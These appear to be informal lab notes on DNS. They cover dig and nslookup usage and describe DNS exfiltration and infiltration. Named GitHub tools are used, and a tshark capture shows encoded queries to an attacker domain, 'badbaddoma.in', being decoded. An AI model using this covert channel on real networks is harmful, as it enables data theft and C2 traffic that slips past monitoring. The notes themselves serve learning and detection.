# dig
can request some dns record to a dns server

dig domain @{DNS SERVER} TYPE 

# ns-lookup 
using in windows machine 

ns-lookup -type={type} {domain}

# DNS EXFILTRATION 

can be used to transfer data from internal network to outside network . 
this can be done by adding the data inside each DNS request the dns is our we log each received request .
in this way the data looks like dns query but we receive the data inside our dns server . 

to exfiltre data we use the script at :  packety.py ( https://github.com/kleosdc/dns-exfil-infil )

When packety.py is executed, you will need to supply the script with the following input: 
FILENAME
DNS SERVER 

to recover the data we use a TSHARK file from the DNS : 
packetGrabber.py (https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py)

user@user1:~/challenges/exfiltration/identify$ tshark -r cap3.pcap "dns"
   11 2.411622590 212.102.44.39 → 172.31.19.239 DNS 108 Standard query 0x0313 A g5SUFQJi3BgPBgh2jYe5Vhm.badbaddoma.in OPT
   12 2.411854471 172.31.19.239 → 212.102.44.39 DNS 216 Standard query response 0x0313 A g5SUFQJi3BgPBgh2jYe5Vhm.badbaddoma.in A 3.17.153.29 NS ns1.badbaddoma.in NS ns2.badbaddoma.in A 3.17.153.29 A 3.17.153.29 OPT
   15 3.054877393 212.102.44.39 → 172.31.19.239 DNS 108 Standard query 0xdc6d A uuhYFkMJxQsVeFSmCrxtyke.badbaddoma.in OPT
   16 3.055118519 172.31.19.239 → 212.102.44.39 DNS 216 Standard query response 0xdc6d A uuhYFkMJxQsVeFSmCrxtyke.badbaddoma.in A 3.17.153.29 NS ns2.badbaddoma.in NS ns1.badbaddoma.in A 3.17.153.29 A 3.17.153.29 OPT
   20 3.623858125 212.102.44.39 → 172.31.19.239 DNS 103 Standard query 0xf9b6 A pDG6RsCnrcFxCWEGji.badbaddoma.in OPT
   21 3.624134900 172.31.19.239 → 212.102.44.39 DNS 206 Standard query response 0xf9b6 A pDG6RsCnrcFxCWEGji.badbaddoma.in A 3.17.153.29 NS ns2.badbaddoma.in NS ns1.badbaddoma.in A 3.17.153.29 A 3.17.153.29 OPT
user@user1:~/challenges/exfiltration/identify$ python3 ~/dns-exfil-infil/packetyGrabber.py
File captured: cap3.pcap
Filename output: response.txt
Domain Name (Example: badbaddoma.in): 
Domain Name (Example: badbaddoma.in): badbaddoma.in


# DNS INFILTRATION 

used to inlfitrate data inside the dns txt . used to pass code or C2 server execution .